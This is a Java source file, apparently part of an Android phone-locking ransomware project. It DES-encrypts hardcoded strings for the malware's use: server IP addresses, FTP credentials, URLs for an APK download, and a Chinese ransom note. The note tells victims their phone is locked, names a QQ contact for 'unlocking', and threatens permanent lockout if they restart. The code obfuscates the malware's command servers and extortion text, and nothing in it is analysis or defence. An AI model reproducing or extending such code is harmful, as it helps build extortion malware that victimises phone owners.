import encrypt.DES;

/**
 * @author Administrator
 *
 */
public class Main {
	private static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// 自定义密钥
	private static DES des = null;
	
    //public static final String HOST = "119.23.68.205";//服务器IP
    //public static final String HOST = "120.76.56.164";//
	public static final String HOST1 = "119.23.35.238";
	public static final String HOST2 = "119.23.35.23";
	public static final String HOST3 = "154.221.19.215";
    public static final String FTP_USER_NAME="byc";
    public static final String FTP_USER_PWD="byc";
    
    public volatile static String uIP="";//更新服务器地址
 
    public volatile static String cIP="";//控制服务器地址
    
    public volatile static String ftpPwd="byc";
    public volatile static String ftpUserName="byc";
    
    public final static String DOWNLOAD="http://119.23.68.205/android/files/apk/maj.apk";//下载地址
    public final static String DOWNLOAD2="http://119.23.68.205/android/files/apk/";//下载地址
    public static final String HOMEPAGE="http://119.23.68.205/android/android.htm";//下载地址
    public static final String LOCAK_SAY="您的手机遭遇网络攻击！\n已暂时锁定！\n请联系客服：\nQQ：1096754477\n解锁!\n警告：请记牢客服QQ号，千万不能重启手机！否则手机会被永久锁死！";
    
	/**
	 * @param args
	 */
	public static void main(String[] args) {
	    //************************************解密字符串*********************************
		des = DES.getDes(KEY);
		encryptstring(FTP_USER_NAME);
		encryptstring(HOST1);
		encryptstring(HOST2);
		encryptstring(HOST3);
		encryptstring(DOWNLOAD);
		encryptstring(DOWNLOAD2);
		encryptstring(HOMEPAGE);
		encryptstring(LOCAK_SAY);
	}
	private  static void encryptstring(String str){
		try {
			
			System.out.println("加密前的字符：" + str);
			String res=des.encode(str);
			System.out.println("加密后的字符：" + res);
			System.out.println("解密后的字符：" + des.decode(des.encode(str)));
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
